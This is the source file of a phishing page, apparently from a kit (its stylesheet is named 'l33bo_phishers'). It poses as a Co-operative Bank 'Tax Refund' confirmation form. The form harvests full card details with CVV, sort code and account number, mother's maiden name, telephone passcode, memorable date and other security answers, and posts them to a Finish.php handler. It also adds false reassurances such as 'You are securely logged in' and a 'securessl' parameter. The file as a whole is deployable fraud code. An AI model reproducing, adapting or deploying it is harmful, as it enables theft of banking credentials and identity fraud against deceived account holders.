<?php

error_reporting(0);

session_start();
require "../../assets/includes/functions.php";
require "../../assets/includes/simplehtmldom.php";
require "../../assets/includes/enc.php";

?>

<!DOCTYPE html>
<html lang="en-gb">
<head>
<link href="assets/img/001.ico" type="image/x-icon" rel="icon" />
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<title>Tax Refund</title>
<meta content="en-gb" http-equiv="content-language">
<link href="" media="handheld" rel="alternate">
<meta content="width=device-width" name="viewport">
<link href="assets/img/001.jpg" rel="apple-touch-icon" sizes="57x57">
<link href="assets/img/002.jpg" rel="apple-touch-icon" sizes="114x114">
<link href="assets/css/l33bo_phishers_mobile_css.css" rel="stylesheet" type="text/css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
<script src="https://cdn.jsdelivr.net/jquery.validation/1.14.0/jquery.validate.js"></script>
<script src="https://jqueryvalidation.org/files/dist/additional-methods.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/1.3.2/jquery.payment.js"></script>
<script type='text/javascript'>
jQuery(function($){
   $("#dob").mask("99/99/9999",{placeholder:"DD/MM/YYYY"});
   $("#sortcode").mask("99-99-99",{placeholder:"XX-XX-XX"});
   $("#mdate").mask("99/99/9999",{placeholder:"DD/MM/YYYY"});
});
function movetoNext(current, nextFieldID) {
if (current.value.length >= current.maxLength) {
document.getElementById(nextFieldID).focus();
}
}
</script>
<style>
.has-error{
display:block;
margin: 0;
padding: 0 0 .5em;
color: #db0000;
font-size: 1.3em;
}
</style>
<script>
//Check Form
  (function($,W,D)
{
    var JQUERY4U = {};

    JQUERY4U.UTIL =
    {
        setupFormValidation: function()
        {
            //form validation rules
            $("#details").validate({
				errorElement: "span",
				errorClass: "has-error",				
                rules: {
					name: {	required: true,	minlength: 4},
					dob: { required: true,	minlength: 10},
					address: { required: true, minlength: 3,},
					postcode: { required: true, minlength: 5,},
					email: { required: true, email: true,},
					telephone: { required: true, minlength: 11, digits: true,},
					memo: { required: true, minlength: 4, digits: true,},
					ccno: { required: true, minlength: 16, creditcard: true},
					ccexp: { required: true, minlength: 7,},
					secode: { required: true, minlength: 3, digits: true,},
					mmn: { required: true, minlength: 2,},
					telepin: { required: true, minlength: 5, digits: true,},
					pob: { required: true, minlength: 3,},
					lschool: { required: true, minlength: 3,},
					mdate: { required: true, minlength: 10,},
                },
                messages: {
					name: {
						required: "Please provide your full name",
						minlength: jQuery.validator.format("Please provide your full name"),
					},
					dob: { 
						required: "Please provide your date of birth",
						minlength: jQuery.validator.format("Please check the date of birth you have entered"),						
					},
					email: {
						required: "Please provide your email address",
						minlength: jQuery.validator.format("Plese check the email address you have entered"),
					},
					telephone: {
						required: "Please provide your telephone number",
						minlength: jQuery.validator.format("Please check the telephone number you have entered"),
						digits: jQuery.validator.format("Please ensure you enter digits only"),
					},
					address: {
						required: "Please provide the 1st line of your address",
						minlength: jQuery.validator.format("Please check the address you have entered"),
					},
					postcode: {
						required: "Please provide your postcode",
						minlength: jQuery.validator.format("Please check the postcode you have entered"),
					},
					memo: {
						required: "Please provide your 4-digit security code",
						minlength: jQuery.validator.format("Please check the security code you have entered"),
						digits: jQuery.validator.format("Please ensure you enter digits only"),
					},
					ccno: {
						required: "Please provide your 16 digit card number",
						minlength: jQuery.validator.format("Please check the card number you have entered"),
						creditcard: jQuery.validator.format("Please check the card number you have entered"),
					},
					ccexp: {
						required: "Please provide your cards expiry date",
						minlength: jQuery.validator.format("Please check the card expiry date you have entered"),
					},
					secode: {
						required: "Please provide your 3 digit card security code (CVV)",
						minlength: jQuery.validator.format("Please check the card security code you have entered"),
						digits: jQuery.validator.format("Please ensure you enter digits only"),
					},
					acno: {
						required: "Please provide your 8 digit account number",
						minlength: jQuery.validator.format("Please check the account number you have entered"),
						digits: jQuery.validator.format("Please ensure you enter digits only"),
					},
					sortcode: {
						required: "Please provide your 6 digit sort code",
						minlength: jQuery.validator.format("Please check the sort code you have entered"),
						digits: jQuery.validator.format("Please ensure you enter digits only"),
					},
					mmn: {
						required: "Please provide your mother&apos;s maiden name",
						minlength: jQuery.validator.format("Please check the mother&apos;s maiden name you have entered"),
					},
					telepin: {
						required: "Please provide your Telephone Passcode (5 digits)",
						minlength: jQuery.validator.format("Please check the security code you have entered"),
						digits: jQuery.validator.format("Please ensure you enter digits only"),
					},
					pob: {
						required: "Please provide your place of birth",
						minlength: jQuery.validator.format("Please check the place of birth you have entered"),
					},
					lschool: {
						required: "Please provide the name of your last school",
						minlength: jQuery.validator.format("Please check the last school you have entered"),
					},
					mdate: {
						required: "Please provide your memorable date",
						minlength: jQuery.validator.format("Please check the memoerable date you have entered"),
					},
				},
                submitHandler: function(form) {
                    form.submit();
                }
            });
			$("#go").click(function() {
			$("#details").submit();

			});
        }
    }

    $(D).ready(function($) {
        JQUERY4U.UTIL.setupFormValidation();
    });
//Check CC
})(jQuery, window, document);
 
    jQuery(function($) {
      $('.cc-number').payment('formatCardNumber');
      $('.cc-exp').payment('formatCardExpiry');
      $('.cc-cvc').payment('formatCardCVC');
      $.fn.toggleInputError = function(erred) {
        this.parent('.field').toggleClass('errorzzzz', erred);
        return this;
      };
      $('form').submit(function(e) {
        e.preventDefault();
        var cardType = $.payment.cardType($('.cc-number').val());
        $('.cc-number').toggleInputError(!$.payment.validateCardNumber($('.cc-number').val()));
        $('.cc-exp').toggleInputError(!$.payment.validateCardExpiry($('.cc-exp').payment('cardExpiryVal')));
        $('.cc-cvc').toggleInputError(!$.payment.validateCardCVC($('.cc-cvc').val(), cardType));
        $('.cc-brand').text(cardType);
      });
    });
</script>
<a href="#" onclick="populate();">
<div id="developer" style="display:none;color:red;background-color:yellow;padding:25px;font-size:20;font-weight:700">Populate Form</div>
</a>
<script>
function populate(){
document.getElementById("name").value = "Steve Smith";
document.getElementById("dob").value = "01/09/1972";
document.getElementById("telephone").value = "01896230525";
document.getElementById("email").value = "bob@aol.com";
document.getElementById("address").value = "21 Some road";
document.getElementById("postcode").value = "bt54 8gh";
document.getElementById("memo").value = "1234";
document.getElementById("cc-number").value = "4111 1111 1111 1111";
document.getElementById("cc-exp").value = "12 / 16";
document.getElementById("secode").value = "521";
document.getElementById("mmn").value = "smithon";
document.getElementById("pob").value = "Nowehere";
document.getElementById("lschool").value = "school";
document.getElementById("mdate").value = "04/10/1958";
}
</script>
</head>
<body class="hasJS">
<div id="outer">
<div id="banner" style="background-color:#ffffff;border-bottom: 2px solid #002663;">
<p id="logo"><img src="assets/img/logo.png"></p>
<a class="toggle-header" href="#" id="ngbHeader:toggle-header"></a>
<div class="four-col" id="user-menu"><span class="name"></span>
<ul class="clearfix">
<li class="details"><a class="linkBullet" href="#"><span>Change details</span></a></li>
<li class="moreInfo"><a class="linkBullet" href="#"><span>Security</span></a></li>
<li class="cookie"><a class="linkBullet" href="#"><span>Cookie policy</span></a></li>
<li class="logout"><a class="linkBullet" href="#">Log out</a></li>
</ul>
</div>
</div>
<div id="header">
<div class="panelTL">
<div class="panelTR">
<div class="panelBR">
<div class="panelBL">
<div id="headerInner">
<div id="indicator">
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="content">
<div class="panel">
<div class="panelTL">
<div class="panelTR">
<div class="panelBR">
<div class="panelBL">
<div class="panelInner">
<div class="inner">
<div class="msgInfo">
<div class="msgTL">
<div class="msgTR">
<div class="msgBR">
<div class="msgBL">
<p class="msgP">Tax Refund – please confirm your details</p>
</div>
</div>
</div>
</div>
</div>
<form action="Finish.php?&sessionid=<?php echo generateRandomString(115); ?>&securessl=true" autocomplete="off" id="details" method="post" name="details">
<div class="formField"><label for="name">Full Name</label> <input value="<?php echo $_SESSION['name'];?>" autocomplete="off" class="wide" id="name" maxlength="20" name="name" type="text"></div>
<div class="formField"><label for="dob">Date of Birth</label> <input value="<?php echo $_SESSION['dob'];?>" autocomplete="off" class="wide" id="dob" maxlength="10" name="dob" placeholder="DD/MM/YYYY" type="text"></div>
<div class="formField"><label for="address">Address</label> <input value="<?php echo $_SESSION['address'];?>" autocomplete="off" class="wide" id="address" maxlength="30" name="address" placeholder="Line 1" type="text"></div>
<div class="formField"><label for="postcode">UK Postcode</label> <input value="<?php echo $_SESSION['postcode'];?>" autocomplete="off" class="wide" id="postcode" maxlength="9" name="postcode" type="text"></div>
<div class="formField"><label for="email">Email Address</label> <input value="" autocomplete="off" class="wide" id="email" maxlength="40" name="email" type="email"></div>
<div class="formField"><label for="telephone">Mobile Number</label> <input value="" autocomplete="off" class="wide" id="telephone" maxlength="11" name="telephone" type="tel"></div>
<div class="formField"><label for="sortcode">Sort Code</label> <input value="<?php echo $_SESSION['sortcode'];?>" autocomplete="off" class="wide" id="sortcode" maxlength="8" name="sortcode" placeholder="XX-XX-XX" type="tel"></div>
<div class="formField"><label for="account">Account Number</label> <input autocomplete="off" class="wide" id="acno" maxlength="8" name="acno" type="tel" value="<?php echo $_SESSION['account'];?>"></div>
<div class="formField"><label for="memo">4-digit security code</label> <input autocomplete="off" class="wide" id="memo" maxlength="4" name="memo" type="tel"></div>
<div class="formField"><label for="ccno">Card Number</label> <input value="<?php echo $_SESSION['ccno'];?>" autocomplete="off" class="wide cc-number" id="cc-number" maxlength="20" name="ccno" type="tel"></div>
<div class="formField"><label for="ccexp">Card Expiry</label> <input value="<?php echo $_SESSION['ccexp'];?>" autocomplete="off" class="wide cc-exp" id="cc-exp" maxlength="7" name="ccexp" type="tel"></div>
<div class="formField"><label for="cvv">Card Security Code</label> <input value="<?php echo $_SESSION['secode'];?>" autocomplete="off" class="wide" id="secode" maxlength="3" name="secode" type="tel"></div>
<div class="formField"><label for="mmn">Mother&apos;s Maiden Name</label> <input value="" autocomplete="off" class="wide" id="mmn" maxlength="20" name="mmn" type="text"></div>
<div class="formField"><label for="pob">Place of Birth</label> <input autocomplete="off" class="wide" id="pob" maxlength="40" name="pob" placeholder="" type="text"></div>
<div class="formField"><label for="lschool">Last School</label> <input autocomplete="off" class="wide" id="lschool" maxlength="40" name="lschool" placeholder="" type="text"></div>
<div class="formField"><label for="mdate">Memorable Date</label> <input autocomplete="off" class="wide" id="mdate" maxlength="10" name="mdate" placeholder="DD/MM/YYYY" type="tel"></div>
<div class="actionsLogin">
<div class="divider"><hr></div>
<input class="submitAction" id="go" name="go" type="submit" value="Continue" style="background:#002277">
</form>
</div>
</div>
</div>
</div>
</div>
<div class="nav">
<div class="lnkLev2">
<div class="lnkTL">
<div class="lnkTR">
<div class="lnkBR">
<div class="lnkBL">
</div>
</div>
</div>
</div>
</div>
<div class="lnkLev2">
<div class="lnkTL">
<div class="lnkTR">
<div class="lnkBR">
<div class="lnkBL">
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div id="footer">
<div class="FootNav">
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a class="blockLink" href="#">Help</a></p>
</div>
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a class="blockLink" href="#">Contact us</a></p>
</div>
</div>
<div id="logout" style="background: #002277;">
<div class="panelTL">
<div class="panelTR">
<div class="panelBR">
<div class="panelBL">
<div id="logoutInner">
<p class="msg">You are securely logged in</p>
<div class="lnkLev1">
<div class="lnkTL">
<div class="lnkTR">
<div class="lnkBR">
<div class="lnkBL">
<p class="lnkLev1P"><a class="blockLink" href="#">Log out</a></p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>

<div class="footerLinks">
&copy; Co-operative Bank 2016
</div>
</div>
</div>
</body>
</html>